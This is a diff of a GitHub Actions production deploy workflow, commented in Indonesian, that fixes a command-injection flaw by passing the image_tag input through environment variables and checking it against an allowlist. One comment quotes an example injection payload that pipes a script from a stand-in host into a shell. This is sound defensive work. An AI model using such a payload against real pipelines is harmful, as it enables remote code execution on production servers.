@@ -27,10 +27,41 @@ jobs:
       # tanpa input), pakai commit HEAD seperti biasa.
       - name: Tentukan IMAGE_TAG
         id: image_tag
+        # Audit keamanan 15 Sep 2026 (temuan Medium, command injection): input
+        # workflow_dispatch `image_tag` sebelumnya diinterpolasi MENTAH lewat
+        # ${{ }} langsung ke body shell script di step ini (termasuk di dalam
+        # `[ -n "..." ]`) DAN ke beberapa run:/script SSH di bawah yang memakai
+        # steps.image_tag.outputs.value (sed -i .env, docker manifest inspect,
+        # dst). GitHub Actions mensubstitusi ${{ }} sebagai TEKS MENTAH sebelum
+        # shell/SSH jalan (bukan lewat shell-variable expansion yang di-
+        # escape) -- input semacam `"; curl evil.sh | sh #` bisa mengeksekusi
+        # command arbitrer di runner INI, dan (lebih parah) DI DALAM sesi SSH
+        # ke VPS PRODUCTION yang pegang PROD_SSH_KEY. Memicu workflow_dispatch
+        # butuh akses write repo, tapi ini tetap celah defense-in-depth nyata
+        # untuk kolaborator/PAT yang disusupi.
+        #
+        # Perbaikan: (1) nilai mentah HANYA disuntik sekali lewat env: di
+        # bawah -- satu-satunya ${{ }} yang menyentuh input pengguna di
+        # seluruh alur ini -- dipakai sebagai variabel shell biasa
+        # ($INPUT_IMAGE_TAG) dari sini seterusnya; (2) validasi allowlist
+        # SEBELUM nilainya sempat ditulis ke $GITHUB_OUTPUT, supaya semua step
+        # lain (yang menurunkan nilainya dari steps.image_tag.outputs.value,
+        # bukan dari input mentah lagi) otomatis ikut terlindungi. Format yang
+        # valid di repo ini HANYA commit sha git (hex) atau tag rilis
+        # semver-ish (mis. v1.2.3) -- keduanya cuma alfanumerik + titik/dash/
+        # underscore, jadi allowlist itu cukup longgar untuk pemakaian sah
+        # tapi cukup ketat untuk menolak metakarakter shell (`;|&$()<>` dkk,
+        # spasi, newline).
+        env:
+          INPUT_IMAGE_TAG: ${{ github.event.inputs.image_tag }}
         run: |
-          if [ -n "${{ github.event.inputs.image_tag }}" ]; then
-            echo "value=${{ github.event.inputs.image_tag }}" >> "$GITHUB_OUTPUT"
-            echo "::notice::Rollback/redeploy manual ke tag: ${{ github.event.inputs.image_tag }}"
+          if [ -n "$INPUT_IMAGE_TAG" ]; then
+            if ! echo "$INPUT_IMAGE_TAG" | grep -qE '^[A-Za-z0-9._-]+$'; then
+              echo "::error::Input image_tag tidak valid: \"$INPUT_IMAGE_TAG\". Hanya huruf/angka/titik(.)/dash(-)/underscore(_) yang diperbolehkan (commit sha atau tag rilis, mis. v1.2.3) -- ditolak untuk mencegah command injection ke shell/SSH production di step-step berikutnya."
+              exit 1
+            fi
+            echo "value=$INPUT_IMAGE_TAG" >> "$GITHUB_OUTPUT"
+            echo "::notice::Rollback/redeploy manual ke tag: $INPUT_IMAGE_TAG"
           else
             echo "value=${{ github.sha }}" >> "$GITHUB_OUTPUT"
           fi
@@ -57,9 +88,10 @@ jobs:
         run: echo "lower=${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"
 
       - name: Tunggu image api & web tersedia di GHCR
+        env:
+          IMAGE_TAG: ${{ steps.image_tag.outputs.value }}
+          REPO: ${{ steps.repo.outputs.lower }}
         run: |
-          IMAGE_TAG="${{ steps.image_tag.outputs.value }}"
-          REPO="${{ steps.repo.outputs.lower }}"
           for i in $(seq 1 30); do
             if docker manifest inspect "ghcr.io/${REPO}/api:${IMAGE_TAG}" >/dev/null 2>&1 && \
                docker manifest inspect "ghcr.io/${REPO}/web:${IMAGE_TAG}" >/dev/null 2>&1; then
@@ -123,15 +155,23 @@ jobs:
       # manual, lihat catatan di scripts/rollback.sh.
       - name: Jalankan migrasi database (production)
         uses: appleboy/ssh-action@0ff4204d59e8e51228ff73bce53f80d53301dee2 # v1 -- audit OWASP A08 4 Sep 2026: SHA-pin (action ini pegang PROD_SSH_KEY/STAGING_SSH_KEY)
+        # Audit keamanan 15 Sep 2026: IMAGE_TAG (sudah divalidasi allowlist di
+        # step "Tentukan IMAGE_TAG") disuntik lewat env: + envs: di bawah,
+        # BUKAN raw ${{ }} langsung di dalam script SSH -- lihat komentar
+        # lengkap di step "Tentukan IMAGE_TAG" soal kenapa ini penting
+        # (script SSH ini pegang PROD_SSH_KEY, jalan di VPS production
+        # sungguhan).
+        env:
+          IMAGE_TAG: ${{ steps.image_tag.outputs.value }}
         with:
           host: ${{ secrets.PROD_HOST }}
           username: ${{ secrets.PROD_SSH_USER }}
           key: ${{ secrets.PROD_SSH_KEY }}
           port: ${{ secrets.PROD_SSH_PORT }}
+          envs: IMAGE_TAG
           script: |
             set -e
             cd /opt/jeonme-production
-            export IMAGE_TAG=${{ steps.image_tag.outputs.value }}
             sed -i "s/^IMAGE_TAG=.*/IMAGE_TAG=${IMAGE_TAG}/" .env
             # pull_with_retry -- insiden nyata, 8 September 2026 (deploy
             # staging): "docker compose pull" gagal total ("dial tcp
@@ -175,15 +215,20 @@ jobs:
 
       - name: Deploy via SSH
         uses: appleboy/ssh-action@0ff4204d59e8e51228ff73bce53f80d53301dee2 # v1 -- audit OWASP A08 4 Sep 2026: SHA-pin (action ini pegang PROD_SSH_KEY/STAGING_SSH_KEY)
+        # Audit keamanan 15 Sep 2026: lihat catatan di step "Jalankan migrasi
+        # database (production)" di atas -- IMAGE_TAG disuntik lewat env: +
+        # envs:, bukan raw ${{ }} di dalam script SSH.
+        env:
+          IMAGE_TAG: ${{ steps.image_tag.outputs.value }}
         with:
           host: ${{ secrets.PROD_HOST }}
           username: ${{ secrets.PROD_SSH_USER }}
           key: ${{ secrets.PROD_SSH_KEY }}
           port: ${{ secrets.PROD_SSH_PORT }}
+          envs: IMAGE_TAG
           script: |
             set -e
             cd /opt/jeonme-production
-            export IMAGE_TAG=${{ steps.image_tag.outputs.value }}
             sed -i "s/^IMAGE_TAG=.*/IMAGE_TAG=${IMAGE_TAG}/" .env
             # pull_with_retry -- lihat catatan lengkap di step "Jalankan
             # migrasi database" di atas (insiden nyata 8 September 2026,
@@ -253,6 +298,15 @@ jobs:
       # sama> di /opt/jeonme-production/.env (lihat pesan error di bawah).
       - name: Health check (via SSH loopback di VPS)
         uses: appleboy/ssh-action@0ff4204d59e8e51228ff73bce53f80d53301dee2 # v1 -- audit OWASP A08 4 Sep 2026: SHA-pin (action ini pegang PROD_SSH_KEY/STAGING_SSH_KEY)
+        # Audit keamanan 15 Sep 2026: EXPECTED_VERSION (dari
+        # steps.image_tag.outputs.value, sudah divalidasi allowlist) disuntik
+        # lewat env: + envs: seperti step SSH lain di atas, bukan raw ${{ }}
+        # di dalam script. `envs:` di bawah sebelumnya sudah ada tapi tidak
+        # tersambung ke env: apa pun di step ini -- sekarang benar-benar
+        # dipakai action untuk export ke sesi SSH.
+        env:
+          EXPECTED_VERSION: ${{ steps.image_tag.outputs.value }}
+          HEALTH_TOKEN: ${{ secrets.PROD_HEALTH_TOKEN }}
         with:
           host: ${{ secrets.PROD_HOST }}
           username: ${{ secrets.PROD_SSH_USER }}
@@ -262,8 +316,6 @@ jobs:
           script: |
             set -e
             cd /opt/jeonme-production
-            EXPECTED_VERSION="${{ steps.image_tag.outputs.value }}"
-            HEALTH_TOKEN="${{ secrets.PROD_HEALTH_TOKEN }}"
             if [ -z "$HEALTH_TOKEN" ]; then
               echo "::error::Secret PROD_HEALTH_TOKEN belum diset -- health check tidak bisa memverifikasi version (lihat komentar step ini soal kenapa deteksi loopback murni-IP tidak bisa dipakai di sini). Set secret ini di GitHub (Settings > Secrets > Actions) DAN baris HEALTH_TOKEN=<nilai yang sama> di /opt/jeonme-production/.env di VPS, lalu deploy ulang."
               exit 1
